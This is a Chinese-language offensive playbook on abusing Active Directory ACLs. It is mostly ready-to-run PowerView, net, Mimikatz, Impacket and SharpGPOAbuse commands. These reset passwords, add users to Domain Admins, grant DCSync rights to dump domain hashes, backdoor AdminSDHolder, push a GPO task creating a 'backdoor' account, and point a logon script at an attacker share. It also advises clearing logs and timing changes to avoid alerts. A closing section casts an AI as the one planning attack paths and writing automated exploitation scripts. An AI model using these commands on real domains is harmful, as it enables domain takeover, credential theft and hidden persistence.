# ACL 滥用

Active Directory 的访问控制列表（ACL）配置错误可以被利用来提升权限和横向移动。

## ACL 基础

### 访问控制模型

**ACE (Access Control Entry)**：
- 定义谁可以对对象执行什么操作
- 包含 SID、权限类型、权限

**ACL (Access Control List)**：
- ACE 的集合
- DACL（自主访问控制列表）
- SACL（系统访问控制列表）

### 权限类型

**通用权限**：
- GenericAll
- GenericWrite
- GenericRead
- GenericExecute

**特定权限**：
- WriteProperty
- WriteDacl
- WriteOwner
- ExtendedRight

## 危险的 ACE

### GenericAll

**完全控制**：
- 可以修改对象的所有属性
- 可以修改 ACL
- 可以删除对象

**用户对象**：
```powershell
# 修改密码
net user target newpassword /domain

# PowerView
Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
```

**组对象**：
```powershell
# 添加成员
net group "Domain Admins" user /add /domain

# PowerView
Add-DomainGroupMember -Identity 'Domain Admins' -Members user
```

**计算机对象**：
- 基于资源的约束委派（RBCD）
- 修改 msDS-AllowedToActOnBehalfOfOtherIdentity

### GenericWrite

**写入属性**：
- 修改对象属性
- 不能修改 ACL

**用户对象**：
```powershell
# 设置 SPN（Kerberoasting）
Set-DomainObject -Identity target -Set @{serviceprincipalname='HTTP/target'}

# 禁用预认证（AS-REP Roasting）
Set-DomainObject -Identity target -XOR @{useraccountcontrol=4194304}

# 设置脚本路径
Set-DomainObject -Identity target -Set @{scriptpath='\\attacker\share\evil.ps1'}
```

**组对象**：
```powershell
# 添加成员
Add-DomainGroupMember -Identity 'Domain Admins' -Members user
```

**计算机对象**：
```powershell
# RBCD
Set-DomainObject -Identity target$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SD}
```

### WriteDacl

**修改 ACL**：
- 可以给自己添加任意权限
- 通常导致完全控制

**利用**：
```powershell
# PowerView
Add-DomainObjectAcl -TargetIdentity target -PrincipalIdentity attacker -Rights All

# 然后使用新权限
Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
```

### WriteOwner

**修改所有者**：
- 将自己设置为对象所有者
- 所有者可以修改 ACL

**利用**：
```powershell
# PowerView
Set-DomainObjectOwner -Identity target -OwnerIdentity attacker

# 然后修改 ACL
Add-DomainObjectAcl -TargetIdentity target -PrincipalIdentity attacker -Rights All
```

### ForceChangePassword

**强制修改密码**：
- ExtendedRight：User-Force-Change-Password
- 可以重置用户密码

**利用**：
```powershell
# PowerView
Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# LDAP
$user = [ADSI]"LDAP://CN=target,CN=Users,DC=domain,DC=com"
$user.SetPassword("Password123!")
$user.SetInfo()
```

### Self (Self-Membership)

**添加自己到组**：
- 可以将自己添加为组成员
- 适用于某些特权组

**利用**：
```powershell
net group "Domain Admins" attacker /add /domain
```

### ReadLAPSPassword

**读取 LAPS 密码**：
- ms-Mcs-AdmPwd 属性
- 本地管理员密码

**利用**：
```powershell
# PowerView
Get-DomainObject -Identity target -Properties ms-Mcs-AdmPwd

# LDAP
Get-ADComputer target -Properties ms-Mcs-AdmPwd
```

### ReadGMSAPassword

**读取 gMSA 密码**：
- msDS-ManagedPassword 属性
- 组托管服务账户密码

**利用**：
```powershell
# DSInternals
$gmsa = Get-ADServiceAccount -Identity gmsa$ -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp
```

## 攻击路径

### 用户到用户
1. 发现 ACL 权限
2. 修改目标用户密码
3. 使用新密码登录

### 用户到组
1. 发现对组的 GenericWrite
2. 将自己添加到组
3. 获得组权限

### 用户到计算机
1. 发现对计算机的 GenericWrite
2. 配置 RBCD
3. 模拟高权限用户

### 用户到域
1. 发现对域对象的 WriteDacl
2. 添加 DCSync 权限
3. 导出域哈希

## DCSync 权限

### 所需权限
- DS-Replication-Get-Changes
- DS-Replication-Get-Changes-All
- DS-Replication-Get-Changes-In-Filtered-Set

### 添加 DCSync 权限

**PowerView**：
```powershell
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity attacker -Rights DCSync
```

**手动**：
```powershell
$user = Get-ADUser attacker
$acl = Get-Acl "AD:\DC=domain,DC=com"
$sid = [System.Security.Principal.SecurityIdentifier]$user.SID

# DS-Replication-Get-Changes
$ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "ExtendedRight", "Allow", [Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")

# DS-Replication-Get-Changes-All
$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "ExtendedRight", "Allow", [Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")

$acl.AddAccessRule($ace1)
$acl.AddAccessRule($ace2)
Set-Acl -Path "AD:\DC=domain,DC=com" -AclObject $acl
```

### 执行 DCSync

**Mimikatz**：
```
lsadump::dcsync /domain:domain.com /all /csv
lsadump::dcsync /domain:domain.com /user:Administrator
```

**Impacket**：
```bash
secretsdump.py domain/attacker:password@dc.domain.com -just-dc
```

## AdminSDHolder

### 原理
- 保护特权组成员的 ACL
- 每 60 分钟同步一次
- 修改 AdminSDHolder 可以持久化权限

### 添加后门

**PowerView**：
```powershell
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -PrincipalIdentity attacker -Rights All
```

**等待同步**：
- 默认 60 分钟
- 或手动触发：`Invoke-SDPropagator`

### 受保护的组
- Domain Admins
- Enterprise Admins
- Schema Admins
- Administrators
- Account Operators
- Backup Operators
- Server Operators
- Print Operators

## GPO 滥用

### GPO 权限
- 对 GPO 的 GenericWrite
- 可以修改 GPO 内容
- 影响应用 GPO 的计算机/用户

### 利用

**SharpGPOAbuse**：
```
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add" --GPOName "Default Domain Policy"
```

**PowerView**：
```powershell
New-GPOImmediateTask -TaskName Update -GPODisplayName "Default Domain Policy" -CommandArguments "-c 'net user backdoor Password123! /add'" -Force
```

## 枚举 ACL

### PowerView

**查找可利用的 ACL**：
```powershell
# 查找当前用户的权限
Find-InterestingDomainAcl -ResolveGUIDs

# 查找特定用户的权限
Get-DomainObjectAcl -Identity target -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $user_sid}

# 查找对域的权限
Get-DomainObjectAcl -Identity "DC=domain,DC=com" -ResolveGUIDs
```

### BloodHound

**收集数据**：
```powershell
# SharpHound
SharpHound.exe -c All

# Python
bloodhound-python -d domain.com -u user -p password -dc dc.domain.com -c All
```

**分析**：
- 可视化攻击路径
- 查找 ACL 滥用路径
- 最短路径到域管理员

### 手动枚举

**PowerShell**：
```powershell
$acl = Get-Acl "AD:\CN=target,CN=Users,DC=domain,DC=com"
$acl.Access | ? {$_.IdentityReference -eq "DOMAIN\attacker"}
```

## 防御绕过

### 隐蔽修改
- 使用合法工具
- 模拟正常管理操作
- 避免大量修改

### 时间选择
- 非工作时间
- 系统维护期间
- 避免触发告警

### 清理痕迹
- 恢复原始 ACL
- 清除日志
- 删除临时对象

---

**AI 发挥空间**：
- 根据枚举结果分析 ACL 攻击路径
- 选择合适的 ACL 滥用方法
- 结合多个 ACL 权限进行攻击
- 开发自动化 ACL 枚举和利用脚本

**反幻觉提示**：
- 不要假设所有对象都有可利用的 ACL
- 验证当前用户的实际权限
- 测试 ACL 修改的实际效果
- 注意 ACL 操作可能触发告警
- 某些权限可能需要额外条件才能利用
